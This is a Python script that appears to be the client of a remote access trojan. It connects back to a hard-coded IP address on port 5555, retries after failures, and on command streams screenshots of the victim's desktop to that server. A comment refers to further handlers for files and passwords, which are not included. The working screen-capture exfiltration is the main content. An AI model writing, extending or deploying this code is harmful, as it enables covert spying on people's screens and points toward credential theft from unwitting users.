import socket
import subprocess
import os
import pyautogui
import cv2
import numpy as np
import threading
import time

HOST = '100.109.211.66'  # Replace with your server's IP
PORT = 5555

def handle_server_connection():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((HOST, PORT))
                while True:
                    data = s.recv(1024).decode()
                    if not data:
                        break
                    
                    # Handle commands (unchanged)
                    if data == "START_STREAM":
                        threading.Thread(target=send_stream, args=(s,)).start()
                    elif data == "STOP_STREAM":
                        pass  # Implement cleanup if needed
                    # Other command handlers (file, passwords, etc.)

        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)

def send_stream(sock):
    while True:
        try:
            screenshot = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
            sock.sendall(buffer.tobytes())
            time.sleep(0.1)
        except Exception as e:
            print(f"Stream error: {e}")
            break

if __name__ == '__main__':
    handle_server_connection()
